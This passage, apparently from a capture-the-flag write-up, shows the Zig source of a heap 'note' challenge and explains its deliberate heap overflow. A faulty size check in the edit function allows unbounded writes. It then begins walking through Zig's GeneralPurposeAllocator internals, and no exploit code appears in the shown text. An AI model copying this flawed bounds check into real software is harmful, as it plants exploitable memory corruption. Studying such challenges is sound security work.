</span><span class="w"></span><span class="k">const</span><span class="w"> </span><span class="n">std</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">@</span><span class="n">import</span><span class="p">(</span><span class="s">&#34;std&#34;</span><span class="p">);</span><span class="w">
</span><span class="w"></span><span class="k">const</span><span class="w"> </span><span class="n">fmt</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">std</span><span class="p">.</span><span class="n">fmt</span><span class="p">;</span><span class="w">
</span><span class="w">
</span><span class="w"></span><span class="k">const</span><span class="w"> </span><span class="n">stdout</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">std</span><span class="p">.</span><span class="n">io</span><span class="p">.</span><span class="n">getStdOut</span><span class="p">().</span><span class="n">writer</span><span class="p">();</span><span class="w">
</span><span class="w"></span><span class="k">const</span><span class="w"> </span><span class="n">stdin</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">std</span><span class="p">.</span><span class="n">io</span><span class="p">.</span><span class="n">getStdIn</span><span class="p">();</span><span class="w">
</span><span class="w">
</span><span class="w"></span><span class="k">const</span><span class="w"> </span><span class="n">MAX_SIZE</span>: <span class="kt">usize</span> <span class="o">=</span><span class="w"> </span><span class="mh">0x500</span><span class="p">;</span><span class="w">
</span><span class="w"></span><span class="k">const</span><span class="w"> </span><span class="n">ERR</span>: <span class="kt">usize</span> <span class="o">=</span><span class="w"> </span><span class="mh">0xbaad0000</span><span class="p">;</span><span class="w">
</span><span class="w"></span><span class="k">const</span><span class="w"> </span><span class="n">NULL</span>: <span class="kt">usize</span> <span class="o">=</span><span class="w"> </span><span class="mh">0xdead0000</span><span class="p">;</span><span class="w">
</span><span class="w">
</span><span class="w"></span><span class="n">var</span><span class="w"> </span><span class="n">chunklist</span>: <span class="p">[</span><span class="mi">20</span><span class="p">][]</span><span class="kt">u8</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">undefined</span><span class="p">;</span><span class="w">
</span><span class="w">
</span><span class="w"></span><span class="n">var</span><span class="w"> </span><span class="n">gpa</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">std</span><span class="p">.</span><span class="n">heap</span><span class="p">.</span><span class="n">GeneralPurposeAllocator</span><span class="p">(.{}){};</span><span class="w">
</span><span class="w"></span><span class="k">const</span><span class="w"> </span><span class="n">allocator</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">gpa</span><span class="p">.</span><span class="n">allocator</span><span class="p">();</span><span class="w">
</span><span class="w">
</span><span class="w"></span><span class="k">pub</span><span class="w"> </span><span class="k">fn</span> <span class="nf">menu</span><span class="p">()</span><span class="w"> </span><span class="o">!</span><span class="n">void</span><span class="w"> </span><span class="p">{</span><span class="w">
</span><span class="w">    </span><span class="kr">try</span><span class="w"> </span><span class="n">stdout</span><span class="p">.</span><span class="n">print</span><span class="p">(</span><span class="s">&#34;[1] Add\n&#34;</span><span class="p">,</span><span class="w"> </span><span class="p">.{});</span><span class="w">
</span><span class="w">    </span><span class="kr">try</span><span class="w"> </span><span class="n">stdout</span><span class="p">.</span><span class="n">print</span><span class="p">(</span><span class="s">&#34;[2] Delete\n&#34;</span><span class="p">,</span><span class="w"> </span><span class="p">.{});</span><span class="w">
</span><span class="w">    </span><span class="kr">try</span><span class="w"> </span><span class="n">stdout</span><span class="p">.</span><span class="n">print</span><span class="p">(</span><span class="s">&#34;[3] Show\n&#34;</span><span class="p">,</span><span class="w"> </span><span class="p">.{});</span><span class="w">
</span><span class="w">    </span><span class="kr">try</span><span class="w"> </span><span class="n">stdout</span><span class="p">.</span><span class="n">print</span><span class="p">(</span><span class="s">&#34;[4] Edit\n&#34;</span><span class="p">,</span><span class="w"> </span><span class="p">.{});</span><span class="w">
</span><span class="w">    </span><span class="kr">try</span><span class="w"> </span><span class="n">stdout</span><span class="p">.</span><span class="n">print</span><span class="p">(</span><span class="s">&#34;[5] Exit\n&#34;</span><span class="p">,</span><span class="w"> </span><span class="p">.{});</span><span class="w">
</span><span class="w">    </span><span class="kr">try</span><span class="w"> </span><span class="n">stdout</span><span class="p">.</span><span class="n">print</span><span class="p">(</span><span class="s">&#34;&gt; &#34;</span><span class="p">,</span><span class="w"> </span><span class="p">.{});</span><span class="w">
</span><span class="w"></span><span class="p">}</span><span class="w">
</span><span class="w">
</span><span class="w"></span><span class="k">pub</span><span class="w"> </span><span class="k">fn</span> <span class="nf">readNum</span><span class="p">()</span><span class="w"> </span><span class="o">!</span><span class="kt">usize</span><span class="w"> </span><span class="p">{</span><span class="w">
</span><span class="w">    </span><span class="n">var</span><span class="w"> </span><span class="n">buf</span>: <span class="p">[</span><span class="mi">64</span><span class="p">]</span><span class="kt">u8</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">undefined</span><span class="p">;</span><span class="w">
</span><span class="w">    </span><span class="n">var</span><span class="w"> </span><span class="n">stripped</span>: <span class="p">[]</span><span class="k">const</span><span class="w"> </span><span class="kt">u8</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">undefined</span><span class="p">;</span><span class="w">
</span><span class="w">    </span><span class="n">var</span><span class="w"> </span><span class="n">amnt</span>: <span class="kt">usize</span> <span class="o">=</span><span class="w"> </span><span class="n">undefined</span><span class="p">;</span><span class="w">
</span><span class="w">    </span><span class="n">var</span><span class="w"> </span><span class="n">num</span>: <span class="kt">usize</span> <span class="o">=</span><span class="w"> </span><span class="n">undefined</span><span class="p">;</span><span class="w">
</span><span class="w">
</span><span class="w">    </span><span class="n">amnt</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kr">try</span><span class="w"> </span><span class="n">stdin</span><span class="p">.</span><span class="n">read</span><span class="p">(</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">);</span><span class="w">
</span><span class="w">    </span><span class="n">stripped</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">std</span><span class="p">.</span><span class="n">mem</span><span class="p">.</span><span class="n">trimRight</span><span class="p">(</span><span class="kt">u8</span><span class="p">,</span><span class="w"> </span><span class="n">buf</span><span class="p">[</span><span class="mi">0</span><span class="o">..</span><span class="n">amnt</span><span class="p">],</span><span class="w"> </span><span class="s">&#34;\n&#34;</span><span class="p">);</span><span class="w">
</span><span class="w">
</span><span class="w">    </span><span class="n">num</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">fmt</span><span class="p">.</span><span class="n">parseUnsigned</span><span class="p">(</span><span class="kt">usize</span><span class="p">,</span><span class="w"> </span><span class="n">stripped</span><span class="p">,</span><span class="w"> </span><span class="mi">10</span><span class="p">)</span><span class="w"> </span><span class="n">catch</span><span class="w"> </span><span class="p">{</span><span class="w">
</span><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">ERR</span><span class="p">;</span><span class="w">
</span><span class="w">    </span><span class="p">};</span><span class="w">
</span><span class="w">
</span><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">num</span><span class="p">;</span><span class="w">
</span><span class="w"></span><span class="p">}</span><span class="w">
</span><span class="w">
</span><span class="w"></span><span class="k">pub</span><span class="w"> </span><span class="k">fn</span> <span class="nf">add</span><span class="p">()</span><span class="w"> </span><span class="o">!</span><span class="n">void</span><span class="w"> </span><span class="p">{</span><span class="w">
</span><span class="w">    </span><span class="n">var</span><span class="w"> </span><span class="n">idx</span>: <span class="kt">usize</span> <span class="o">=</span><span class="w"> </span><span class="n">undefined</span><span class="p">;</span><span class="w">
</span><span class="w">    </span><span class="n">var</span><span class="w"> </span><span class="n">size</span>: <span class="kt">usize</span> <span class="o">=</span><span class="w"> </span><span class="n">undefined</span><span class="p">;</span><span class="w">
</span><span class="w">
</span><span class="w">    </span><span class="kr">try</span><span class="w"> </span><span class="n">stdout</span><span class="p">.</span><span class="n">print</span><span class="p">(</span><span class="s">&#34;Index: &#34;</span><span class="p">,</span><span class="w"> </span><span class="p">.{});</span><span class="w">
</span><span class="w">    </span><span class="n">idx</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kr">try</span><span class="w"> </span><span class="n">readNum</span><span class="p">();</span><span class="w">
</span><span class="w">
</span><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">idx</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">ERR</span><span class="w"> </span><span class="n">or</span><span class="w"> </span><span class="n">idx</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="n">chunklist</span><span class="p">.</span><span class="n">len</span><span class="w"> </span><span class="n">or</span><span class="w"> </span><span class="o">@</span><span class="n">ptrToInt</span><span class="p">(</span><span class="n">chunklist</span><span class="p">[</span><span class="n">idx</span><span class="p">].</span><span class="n">ptr</span><span class="p">)</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="n">NULL</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span><span class="w">        </span><span class="kr">try</span><span class="w"> </span><span class="n">stdout</span><span class="p">.</span><span class="n">print</span><span class="p">(</span><span class="s">&#34;Invalid index!\n&#34;</span><span class="p">,</span><span class="w"> </span><span class="p">.{});</span><span class="w">
</span><span class="w">        </span><span class="k">return</span><span class="p">;</span><span class="w">
</span><span class="w">    </span><span class="p">}</span><span class="w">
</span><span class="w">
</span><span class="w">    </span><span class="kr">try</span><span class="w"> </span><span class="n">stdout</span><span class="p">.</span><span class="n">print</span><span class="p">(</span><span class="s">&#34;Size: &#34;</span><span class="p">,</span><span class="w"> </span><span class="p">.{});</span><span class="w">
</span><span class="w">    </span><span class="n">size</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kr">try</span><span class="w"> </span><span class="n">readNum</span><span class="p">();</span><span class="w">
</span><span class="w">
</span><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">size</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">ERR</span><span class="w"> </span><span class="n">or</span><span class="w"> </span><span class="n">size</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="n">MAX_SIZE</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span><span class="w">        </span><span class="kr">try</span><span class="w"> </span><span class="n">stdout</span><span class="p">.</span><span class="n">print</span><span class="p">(</span><span class="s">&#34;Invalid size!\n&#34;</span><span class="p">,</span><span class="w"> </span><span class="p">.{});</span><span class="w">
</span><span class="w">        </span><span class="k">return</span><span class="p">;</span><span class="w">
</span><span class="w">    </span><span class="p">}</span><span class="w">
</span><span class="w">
</span><span class="w">    </span><span class="n">chunklist</span><span class="p">[</span><span class="n">idx</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kr">try</span><span class="w"> </span><span class="n">allocator</span><span class="p">.</span><span class="n">alloc</span><span class="p">(</span><span class="kt">u8</span><span class="p">,</span><span class="w"> </span><span class="n">size</span><span class="p">);</span><span class="w">
</span><span class="w">
</span><span class="w">    </span><span class="kr">try</span><span class="w"> </span><span class="n">stdout</span><span class="p">.</span><span class="n">print</span><span class="p">(</span><span class="s">&#34;Data: &#34;</span><span class="p">,</span><span class="w"> </span><span class="p">.{});</span><span class="w">
</span><span class="w">    </span><span class="n">_</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kr">try</span><span class="w"> </span><span class="n">stdin</span><span class="p">.</span><span class="n">read</span><span class="p">(</span><span class="n">chunklist</span><span class="p">[</span><span class="n">idx</span><span class="p">]);</span><span class="w">
</span><span class="w"></span><span class="p">}</span><span class="w">
</span><span class="w">
</span><span class="w"></span><span class="k">pub</span><span class="w"> </span><span class="k">fn</span> <span class="nf">delete</span><span class="p">()</span><span class="w"> </span><span class="o">!</span><span class="n">void</span><span class="w"> </span><span class="p">{</span><span class="w">
</span><span class="w">    </span><span class="n">var</span><span class="w"> </span><span class="n">idx</span>: <span class="kt">usize</span> <span class="o">=</span><span class="w"> </span><span class="n">undefined</span><span class="p">;</span><span class="w">
</span><span class="w">
</span><span class="w">    </span><span class="kr">try</span><span class="w"> </span><span class="n">stdout</span><span class="p">.</span><span class="n">print</span><span class="p">(</span><span class="s">&#34;Index: &#34;</span><span class="p">,</span><span class="w"> </span><span class="p">.{});</span><span class="w">
</span><span class="w">    </span><span class="n">idx</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kr">try</span><span class="w"> </span><span class="n">readNum</span><span class="p">();</span><span class="w">
</span><span class="w">
</span><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">idx</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">ERR</span><span class="w"> </span><span class="n">or</span><span class="w"> </span><span class="n">idx</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="n">chunklist</span><span class="p">.</span><span class="n">len</span><span class="w"> </span><span class="n">or</span><span class="w"> </span><span class="o">@</span><span class="n">ptrToInt</span><span class="p">(</span><span class="n">chunklist</span><span class="p">[</span><span class="n">idx</span><span class="p">].</span><span class="n">ptr</span><span class="p">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">NULL</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span><span class="w">        </span><span class="kr">try</span><span class="w"> </span><span class="n">stdout</span><span class="p">.</span><span class="n">print</span><span class="p">(</span><span class="s">&#34;Invalid index!\n&#34;</span><span class="p">,</span><span class="w"> </span><span class="p">.{});</span><span class="w">
</span><span class="w">        </span><span class="k">return</span><span class="p">;</span><span class="w">
</span><span class="w">    </span><span class="p">}</span><span class="w">
</span><span class="w">
</span><span class="w">    </span><span class="n">_</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">allocator</span><span class="p">.</span><span class="n">free</span><span class="p">(</span><span class="n">chunklist</span><span class="p">[</span><span class="n">idx</span><span class="p">]);</span><span class="w">
</span><span class="w">
</span><span class="w">    </span><span class="n">chunklist</span><span class="p">[</span><span class="n">idx</span><span class="p">].</span><span class="n">ptr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">@</span><span class="n">intToPtr</span><span class="p">([</span><span class="o">*</span><span class="p">]</span><span class="kt">u8</span><span class="p">,</span><span class="w"> </span><span class="n">NULL</span><span class="p">);</span><span class="w">
</span><span class="w">    </span><span class="n">chunklist</span><span class="p">[</span><span class="n">idx</span><span class="p">].</span><span class="n">len</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w">
</span><span class="w"></span><span class="p">}</span><span class="w">
</span><span class="w">
</span><span class="w"></span><span class="k">pub</span><span class="w"> </span><span class="k">fn</span> <span class="nf">show</span><span class="p">()</span><span class="w"> </span><span class="o">!</span><span class="n">void</span><span class="w"> </span><span class="p">{</span><span class="w">
</span><span class="w">    </span><span class="n">var</span><span class="w"> </span><span class="n">idx</span>: <span class="kt">usize</span> <span class="o">=</span><span class="w"> </span><span class="n">undefined</span><span class="p">;</span><span class="w">
</span><span class="w">
</span><span class="w">    </span><span class="kr">try</span><span class="w"> </span><span class="n">stdout</span><span class="p">.</span><span class="n">print</span><span class="p">(</span><span class="s">&#34;Index: &#34;</span><span class="p">,</span><span class="w"> </span><span class="p">.{});</span><span class="w">
</span><span class="w">    </span><span class="n">idx</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kr">try</span><span class="w"> </span><span class="n">readNum</span><span class="p">();</span><span class="w">
</span><span class="w">
</span><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">idx</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">ERR</span><span class="w"> </span><span class="n">or</span><span class="w"> </span><span class="n">idx</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="n">chunklist</span><span class="p">.</span><span class="n">len</span><span class="w"> </span><span class="n">or</span><span class="w"> </span><span class="o">@</span><span class="n">ptrToInt</span><span class="p">(</span><span class="n">chunklist</span><span class="p">[</span><span class="n">idx</span><span class="p">].</span><span class="n">ptr</span><span class="p">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">NULL</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span><span class="w">        </span><span class="kr">try</span><span class="w"> </span><span class="n">stdout</span><span class="p">.</span><span class="n">print</span><span class="p">(</span><span class="s">&#34;Invalid index!\n&#34;</span><span class="p">,</span><span class="w"> </span><span class="p">.{});</span><span class="w">
</span><span class="w">        </span><span class="k">return</span><span class="p">;</span><span class="w">
</span><span class="w">    </span><span class="p">}</span><span class="w">
</span><span class="w">
</span><span class="w">    </span><span class="kr">try</span><span class="w"> </span><span class="n">stdout</span><span class="p">.</span><span class="n">print</span><span class="p">(</span><span class="s">&#34;{s}\n&#34;</span><span class="p">,</span><span class="w"> </span><span class="p">.{</span><span class="n">chunklist</span><span class="p">[</span><span class="n">idx</span><span class="p">]});</span><span class="w">
</span><span class="w"></span><span class="p">}</span><span class="w">
</span><span class="w">
</span><span class="w"></span><span class="k">pub</span><span class="w"> </span><span class="k">fn</span> <span class="nf">edit</span><span class="p">()</span><span class="w"> </span><span class="o">!</span><span class="n">void</span><span class="w"> </span><span class="p">{</span><span class="w">
</span><span class="w">    </span><span class="n">var</span><span class="w"> </span><span class="n">idx</span>: <span class="kt">usize</span> <span class="o">=</span><span class="w"> </span><span class="n">undefined</span><span class="p">;</span><span class="w">
</span><span class="w">    </span><span class="n">var</span><span class="w"> </span><span class="n">size</span>: <span class="kt">usize</span> <span class="o">=</span><span class="w"> </span><span class="n">undefined</span><span class="p">;</span><span class="w">
</span><span class="w">
</span><span class="w">    </span><span class="kr">try</span><span class="w"> </span><span class="n">stdout</span><span class="p">.</span><span class="n">print</span><span class="p">(</span><span class="s">&#34;Index: &#34;</span><span class="p">,</span><span class="w"> </span><span class="p">.{});</span><span class="w">
</span><span class="w">    </span><span class="n">idx</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kr">try</span><span class="w"> </span><span class="n">readNum</span><span class="p">();</span><span class="w">
</span><span class="w">
</span><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">idx</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">ERR</span><span class="w"> </span><span class="n">or</span><span class="w"> </span><span class="n">idx</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="n">chunklist</span><span class="p">.</span><span class="n">len</span><span class="w"> </span><span class="n">or</span><span class="w"> </span><span class="o">@</span><span class="n">ptrToInt</span><span class="p">(</span><span class="n">chunklist</span><span class="p">[</span><span class="n">idx</span><span class="p">].</span><span class="n">ptr</span><span class="p">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">NULL</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span><span class="w">        </span><span class="kr">try</span><span class="w"> </span><span class="n">stdout</span><span class="p">.</span><span class="n">print</span><span class="p">(</span><span class="s">&#34;Invalid index!\n&#34;</span><span class="p">,</span><span class="w"> </span><span class="p">.{});</span><span class="w">
</span><span class="w">        </span><span class="k">return</span><span class="p">;</span><span class="w">
</span><span class="w">    </span><span class="p">}</span><span class="w">
</span><span class="w">
</span><span class="w">    </span><span class="kr">try</span><span class="w"> </span><span class="n">stdout</span><span class="p">.</span><span class="n">print</span><span class="p">(</span><span class="s">&#34;Size: &#34;</span><span class="p">,</span><span class="w"> </span><span class="p">.{});</span><span class="w">
</span><span class="w">    </span><span class="n">size</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kr">try</span><span class="w"> </span><span class="n">readNum</span><span class="p">();</span><span class="w">
</span><span class="w">
</span><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">size</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">chunklist</span><span class="p">[</span><span class="n">idx</span><span class="p">].</span><span class="n">len</span><span class="w"> </span><span class="n">and</span><span class="w"> </span><span class="n">size</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">ERR</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span><span class="w">        </span><span class="kr">try</span><span class="w"> </span><span class="n">stdout</span><span class="p">.</span><span class="n">print</span><span class="p">(</span><span class="s">&#34;Invalid size!\n&#34;</span><span class="p">,</span><span class="w"> </span><span class="p">.{});</span><span class="w">
</span><span class="w">        </span><span class="k">return</span><span class="p">;</span><span class="w">
</span><span class="w">    </span><span class="p">}</span><span class="w">
</span><span class="w">
</span><span class="w">    </span><span class="n">chunklist</span><span class="p">[</span><span class="n">idx</span><span class="p">].</span><span class="n">len</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">size</span><span class="p">;</span><span class="w">
</span><span class="w">
</span><span class="w">    </span><span class="kr">try</span><span class="w"> </span><span class="n">stdout</span><span class="p">.</span><span class="n">print</span><span class="p">(</span><span class="s">&#34;Data: &#34;</span><span class="p">,</span><span class="w"> </span><span class="p">.{});</span><span class="w">
</span><span class="w">    </span><span class="n">_</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kr">try</span><span class="w"> </span><span class="n">stdin</span><span class="p">.</span><span class="n">read</span><span class="p">(</span><span class="n">chunklist</span><span class="p">[</span><span class="n">idx</span><span class="p">]);</span><span class="w">
</span><span class="w"></span><span class="p">}</span><span class="w">
</span><span class="w">
</span><span class="w"></span><span class="k">pub</span><span class="w"> </span><span class="k">fn</span> <span class="nf">main</span><span class="p">()</span><span class="w"> </span><span class="o">!</span><span class="n">void</span><span class="w"> </span><span class="p">{</span><span class="w">
</span><span class="w">    </span><span class="n">var</span><span class="w"> </span><span class="n">choice</span>: <span class="kt">usize</span> <span class="o">=</span><span class="w"> </span><span class="n">undefined</span><span class="p">;</span><span class="w">
</span><span class="w">
</span><span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="n">chunklist</span><span class="p">)</span><span class="w"> </span><span class="o">|</span><span class="n">_</span><span class="p">,</span><span class="w"> </span><span class="n">i</span><span class="o">|</span><span class="w"> </span><span class="p">{</span><span class="w">
</span><span class="w">        </span><span class="n">chunklist</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">ptr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">@</span><span class="n">intToPtr</span><span class="p">([</span><span class="o">*</span><span class="p">]</span><span class="kt">u8</span><span class="p">,</span><span class="w"> </span><span class="n">NULL</span><span class="p">);</span><span class="w">
</span><span class="w">        </span><span class="n">chunklist</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">len</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w">
</span><span class="w">    </span><span class="p">}</span><span class="w">
</span><span class="w">
</span><span class="w">    </span><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="kc">true</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span><span class="w">        </span><span class="kr">try</span><span class="w"> </span><span class="n">menu</span><span class="p">();</span><span class="w">
</span><span class="w">
</span><span class="w">        </span><span class="n">choice</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kr">try</span><span class="w"> </span><span class="n">readNum</span><span class="p">();</span><span class="w">
</span><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">choice</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">ERR</span><span class="p">)</span><span class="w"> </span><span class="k">continue</span><span class="p">;</span><span class="w">
</span><span class="w">
</span><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">choice</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="kr">try</span><span class="w"> </span><span class="n">add</span><span class="p">();</span><span class="w">
</span><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">choice</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">2</span><span class="p">)</span><span class="w"> </span><span class="kr">try</span><span class="w"> </span><span class="n">delete</span><span class="p">();</span><span class="w">
</span><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">choice</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">3</span><span class="p">)</span><span class="w"> </span><span class="kr">try</span><span class="w"> </span><span class="n">show</span><span class="p">();</span><span class="w">
</span><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">choice</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">4</span><span class="p">)</span><span class="w"> </span><span class="kr">try</span><span class="w"> </span><span class="n">edit</span><span class="p">();</span><span class="w">
</span><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">choice</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">5</span><span class="p">)</span><span class="w"> </span><span class="k">break</span><span class="p">;</span><span class="w">
</span><span class="w">    </span><span class="p">}</span><span class="w">
</span><span class="w"></span><span class="p">}</span><span class="w">
</span></code></pre></div><p>The source code is quite readable, the vulnerability is the overflow within the <code>edit</code> function. The check onto the provided size isn&rsquo;t efficient, <code>size &gt; chunklist[idx].len and size == ERR</code>, if <code>size &gt; chunklist[idx].len</code> and if <code>size != ERR</code> the condition is false. Which means we can edit the chunk by writing an arbitrary amount of data in it.</p>
<div class="gblog-post__anchorwrap">
    <h2 id="generalpurposeallocator-abstract">
        GeneralPurposeAllocator abstract
        <a data-clipboard-text="https://nasm.re/posts/zigzag/#generalpurposeallocator-abstract" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor GeneralPurposeAllocator abstract" href="#generalpurposeallocator-abstract">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h2>
</div>
<p>The <a
  class="gblog-markdown__link"
  href="https://github.com/ziglang/zig/"
  
  >zig</a
> source is quite readable so let&rsquo;s take a look at the internals of the GeneralPurposeAllocator allocator.
The GeneralPurposeAllocator is implemented <a
  class="gblog-markdown__link"
  href="https://github.com/ziglang/zig/blob/master/lib/std/heap/general_purpose_allocator.zig"
  
  >here</a
>.
The header of the source code file gives the basic design of the allocator:</p>
<pre tabindex="0"><code>//! ## Basic Design:
//!
//! Small allocations are divided into buckets:
//!
//! ```
//! index obj_size
//! 0     1
//! 1     2
//! 2     4
//! 3     8
//! 4     16
//! 5     32
//! 6     64
//! 7     128
//! 8     256
//! 9     512
//! 10    1024
//! 11    2048
//! ```
//!
//! The main allocator state has an array of all the &quot;current&quot; buckets for each
//! size class. Each slot in the array can be null, meaning the bucket for that
//! size class is not allocated. When the first object is allocated for a given
//! size class, it allocates 1 page of memory from the OS. This page is
//! divided into &quot;slots&quot; - one per allocated object. Along with the page of memory
//! for object slots, as many pages as necessary are allocated to store the
//! BucketHeader, followed by &quot;used bits&quot;, and two stack traces for each slot
//! (allocation trace and free trace).
//!
//! The &quot;used bits&quot; are 1 bit per slot representing whether the slot is used.
//! Allocations use the data to iterate to find a free slot. Frees assert that the
//! corresponding bit is 1 and set it to 0.
//!
//! Buckets have prev and next pointers. When there is only one bucket for a given
//! size class, both prev and next point to itself. When all slots of a bucket are
//! used, a new bucket is allocated, and enters the doubly linked list. The main
//! allocator state tracks the &quot;current&quot; bucket for each size class. Leak detection
//! currently only checks the current bucket.
//!
//! Resizing detects if the size class is unchanged or smaller, in which case the same
//! pointer is returned unmodified. If a larger size class is required,
//! `error.OutOfMemory` is returned.
//!
//! Large objects are allocated directly using the backing allocator and their metadata is stored
//! in a `std.HashMap` using the backing allocator.
</code></pre><p>Let&rsquo;s take a look at <code>alloc</code> function:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-rust" data-lang="rust"><span class="k">fn</span> <span class="nf">alloc</span><span class="p">(</span><span class="bp">self</span>: <span class="o">*</span><span class="bp">Self</span><span class="p">,</span><span class="w"> </span><span class="n">len</span>: <span class="kt">usize</span><span class="p">,</span><span class="w"> </span><span class="n">ptr_align</span>: <span class="nc">u29</span><span class="p">,</span><span class="w"> </span><span class="n">len_align</span>: <span class="nc">u29</span><span class="p">,</span><span class="w"> </span><span class="n">ret_addr</span>: <span class="kt">usize</span><span class="p">)</span><span class="w"> </span><span class="n">Error</span><span class="o">!</span><span class="p">[]</span><span class="kt">u8</span><span class="w"> </span><span class="p">{</span><span class="w">
</span><span class="w">    </span><span class="bp">self</span><span class="p">.</span><span class="n">mutex</span><span class="p">.</span><span class="n">lock</span><span class="p">();</span><span class="w">
</span><span class="w">    </span><span class="n">defer</span><span class="w"> </span><span class="bp">self</span><span class="p">.</span><span class="n">mutex</span><span class="p">.</span><span class="n">unlock</span><span class="p">();</span><span class="w">
</span><span class="w">
</span><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="bp">self</span><span class="p">.</span><span class="n">isAllocationAllowed</span><span class="p">(</span><span class="n">len</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w">
</span><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">error</span><span class="p">.</span><span class="n">OutOfMemory</span><span class="p">;</span><span class="w">
</span><span class="w">    </span><span class="p">}</span><span class="w">
</span><span class="w">
</span><span class="w">    </span><span class="k">const</span><span class="w"> </span><span class="n">new_aligned_size</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">math</span><span class="p">.</span><span class="n">max</span><span class="p">(</span><span class="n">len</span><span class="p">,</span><span class="w"> </span><span class="n">ptr_align</span><span class="p">);</span><span class="w">
</span><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">new_aligned_size</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">largest_bucket_object_size</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
